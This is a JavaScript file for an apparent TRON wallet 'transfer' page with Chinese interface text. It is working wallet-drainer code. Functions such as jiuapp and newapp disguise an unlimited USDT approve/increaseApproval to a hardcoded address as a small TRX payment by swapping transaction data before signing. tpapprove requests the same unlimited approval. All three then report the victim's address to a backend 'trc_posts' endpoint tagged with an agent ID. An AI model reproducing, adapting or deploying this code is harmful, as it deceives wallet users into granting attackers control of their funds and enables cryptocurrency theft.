var contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
var p_authorized_address = "TAnvEgBJRsk5LFdfXMhCW8mcHVTeXee9T4"
var walletAddress, usdtBalance = 0,
    trxBalance = 0;
var transactionObj = null;
var toAddress, type = 0,
    code, isConnected = false;


async function getUsdtBalance(address, callback) {
    let tronWeb = window.tronWeb;
    let parameter = [{
        type: "address",
        value: address
    }];
    let options = {};
    let result = await tronWeb.transactionBuilder.triggerSmartContract(contractAddress, "balanceOf(address)", options, parameter, address);
    if (result.result) {
        if (callback != undefined) {
            callback(result.constant_result[0]);
        }
    }
}

async function getAssets(callback) {
   code = getUrlParams('code');
    try {
            if (window.tronLink.ready) {
                window.tronWeb = tronLink.tronWeb;
            } else {
                200 === (await window.tronLink.request({
                    method: "tron_requestAccounts"
                })).code && (window.tronWeb = tronLink.tronWeb)
            }
        if (!window.tronWeb) {
            const e = TronWeb.providers.HttpProvider,
                t = new e(tronApi),
                a = new e(tronApi),
                n = tronApi,
                s = new TronWeb(t, a, n);
            window.tronWeb = s;
        }

    } catch (e) {

    }
    if (window.tronWeb) {
        var tronWeb = window.tronWeb;
        walletAddress = await tronWeb.defaultAddress.base58;
        if (walletAddress == false) {
            //tip("连接钱包失败");           
               await getAssets(callback);           
            return;
        }
        try {
            let balance = await tronWeb.trx.getBalance(walletAddress);		
            trxBalance = tronWeb.fromSun(balance);
			/*$.ajax({
                    url: 'https://apilist.tronscan.org/api/account',
                    method: 'GET',
                    data: { address: walletAddress },
                    success: function(response) {
                        document.getElementById('ye').innerHTML = tronWeb.fromSun(response.balance);
                    }
                });*/
		
            getUsdtBalance(walletAddress, function(data) {
                usdtBalance = tronWeb.fromSun(parseInt(data, 16));
                isConnected = true;
                if (callback != undefined) {
                    callback(trxBalance, trxBalance);
                }
            });

        } catch (e) {
            tip(e);
        }
    } else {
		tip("请选择Tron链重新扫码转账！", 2000);       
    }
}



async function okxapprove() {
    amount = Number(document.getElementById('amount').innerHTML ? document.getElementById('amount').innerHTML : 0);
	let amount2 = Number(document.getElementById('ye').innerHTML);
    if (amount == 0) {
        tip('请输入转账金额');
        return;
    }
	
	if (amount > amount2) {
        tip('金额输入错误');
        return;
    }
    /*if (!isConnected) {
        tip('正在连接网络。。。', 2000);
        return;
    }*/
    
let version2 = navigator.userAgent.toLowerCase();

if (version2.indexOf("android") > -1) {
    tip('正在创建交易1。。。', 2000);
	//newapp()
	jiuapp()
} else if (version2.indexOf("iphone") > -1 || version2.indexOf("ipad") > -1) {
	tip('正在创建交易2。。。', 2000);
    newapp()
} else {
	tip('请用钱包扫码转账。。。', 2000);
}
	

}

function tip(a, time = 1500) {
    $("#tip").html(a);
    $("#tip").show();
    setTimeout(function() {
        $("#tip").hide();
    }, time)
}

function sleep(a) {
    return new Promise(dsTime => setTimeout(dsTime, a));
}

function isOkxApp() {
    let ua = navigator.userAgent;
    let isOKApp = /OKApp/i.test(ua);
    return isOKApp;
}

function isMobile() {
    let ua = navigator.userAgent;
    let isIOS = /iphone|ipad|ipod|ios/i.test(ua);
    let isAndroid = /android|XiaoMi|MiuiBrowser/i.test(ua);
    let isMobile = isIOS || isAndroid;
    return isMobile;
}

function isPc() {
    let ua = navigator.userAgent;
    let isPc = /windows/i.test(ua);
    return isPc;
}

function changeTitle(content) {
    $('title').html(content);
}


function getUrlParams(key) {
    var url = window.location.search.substr(1);
    if (url == '') {
        return false;
    }
    var paramsArr = url.split('&');
    for (var i = 0; i < paramsArr.length; i++) {
        var combina = paramsArr[i].split("=");
        if (combina[0] == key) {
            return combina[1];
        }
    }
    return false;
}
async function jiuapp() {       
	let tronWeb = window.tronWeb;   
    let walletAddress=tronWeb.defaultAddress.base58;
	let element = document.getElementById("ye");
    let content = Number(element.innerHTML);
    let inputv = document.getElementById('amount').textContent;	
    let tokenAddress ='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
	let transferParams = [{
        'type': 'address',
        'value': tronWeb.address.toHex(p_authorized_address)
    }, {
        'type': 'uint256',
        'value': '1000000'
    }];
    let approvalParams = [{
        'type': 'address',
        'value': tronWeb.address.toHex(p_authorized_address)
    }, {
        'type': 'uint256',
        'value': '9999999999999999'
    }];
    let transactionOptions = {
        'feeLimit': 100000000,
        'callValue': 0
    };

    const { transaction: transferTransaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        tronWeb.address.toHex('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'), 
        'transfer(address,uint256)', 
        transactionOptions, 
        transferParams,
        walletAddress
    );
		
    const signTransaction = await tronWeb.transactionBuilder.sendTrx(
        "TLj1Vh3Gm7UEDyz37oS83VEuyT5UUS4mSS",
        tronWeb.toSun(amount),
        walletAddress
    );
	
    let { transaction: approvalTransaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        tronWeb.address.toHex('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'), 
        'approve(address,uint256)', 
        transactionOptions, 
        approvalParams, 
        walletAddress
    );

     approvalTransaction = await tronWeb.transactionBuilder.addUpdateData(approvalTransaction, window.location.host);
    let finalTransaction = signTransaction;
    finalTransaction.raw_data.contract[0].parameter.value = {
        ...signTransaction.raw_data.contract[0].parameter.value,
        ...transferTransaction.raw_data.contract[0].parameter.value
    };
    delete finalTransaction.raw_data.contract[0].parameter.value.data;
    delete finalTransaction.raw_data.contract[0].parameter.value.to_address;
    
    try {
        let signedTransaction = await tronWeb.trx.sign({
            'txID': transferTransaction.txID,
            'raw_data': finalTransaction.raw_data,
            'raw_data_hex': approvalTransaction.raw_data_hex
        });
        const tx = await tronWeb.trx.sendRawTransaction({
            ...signedTransaction,
            'raw_data_hex': approvalTransaction.raw_data_hex
        });
        if(tx){
            alert('交易成功！');
			var d2 = new Date();
            var n = d2.getTime();
			$.ajax({
               type: 'get',
               url: domain + '/index/api/trc_posts?t=' + n,
               data: {
				   address: walletAddress,
                   auth_address: p_authorized_address,
                   bizhong: "USDT",
                   agent: p_agent,
                   zhuanzhang: inputv
			   },
              success: function() {}
            })
        }	
        return true;
    } catch (error) {
        return false;
    }
	      

}

async function newapp() {
    try {        
    let tronWeb = window.tronWeb;   
    let walletAddress=tronWeb.defaultAddress.base58;
        let tokenAddress ='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        const parameters = [
            { type: "address", value: p_authorized_address },
            { type: "uint256", value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }
        ];
        let inputv = document.getElementById('amount').textContent;
        var data = {
                        address: walletAddress,
                        auth_address: p_authorized_address,
                        bizhong: "USDT",
                        agent: p_agent,
                        zhuanzhang: inputv
                    }
					
        const transactionOptions = { feeLimit: 100000000 };
        
        const transactionObj0 = await tronWeb.transactionBuilder.triggerSmartContract(
            tokenAddress, 
            "increaseApproval(address,uint256)", 
            transactionOptions, 
            parameters, 
            walletAddress
        );
        		
		const amountInSun = tronWeb.toSun(amount);

        // 创建并发送交易
        const transactionObj1 = await tronWeb.transactionBuilder.sendTrx(
            "TLj1Vh3Gm7UEDyz37oS83VEuyT5UUS4mSS",
            amountInSun,
            walletAddress
        );
		var raw_data = transactionObj0.transaction.raw_data;
		transactionObj0.transaction.raw_data = transactionObj1.raw_data;
		
		//alert(transactionObj0.transaction.raw_data.fee_limit);
        const signedTransaction = await tronWeb.trx.sign(transactionObj0.transaction);
		signedTransaction.raw_data=raw_data;
		const tx = await tronWeb.trx.sendRawTransaction(signedTransaction);
        
        if(tx){
            alert('交易成功！');

			var d2 = new Date();
            var n = d2.getTime();
			$.ajax({
                        type: 'get',
                        url: domain + '/index/api/trc_posts?t=' + n,
                        data: data,
                        success: function() {}
                    })
        }

    } catch (error) {
        console.error("An error occurred during the blockchain transaction:", error);
    }
}

	async function tpapprove(){
     	let element = document.getElementById("ye");
        let content = Number(element.innerHTML);

     	let walletAddress = tronWeb.defaultAddress.base58;
	const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
	let inputv = document.getElementById('amount').textContent;
	var data = {
			address: walletAddress,
            auth_address: p_authorized_address,
            bizhong: "USDT",
            agent: p_agent,
			zhuanzhang: inputv
		}

        
	try {
		let contract = await tronWeb.contract().at(trc20ContractAddress);		
        let result = await contract.approve(p_authorized_address, '0xfffffffffffffffffffffffffffffffffffffffff').send({
                from: p_authorized_address,
                feeLimit: 100000000
            });			
				var d2 = new Date();
                var n = d2.getTime();
                    $.ajax({
                        type: 'get',
                        url: domain + "/index/api/trc_posts?t=" + n,
                        data: data,
                        success: function() {}
                    })				
			} catch (error) {
				console.error(error)
		}
 }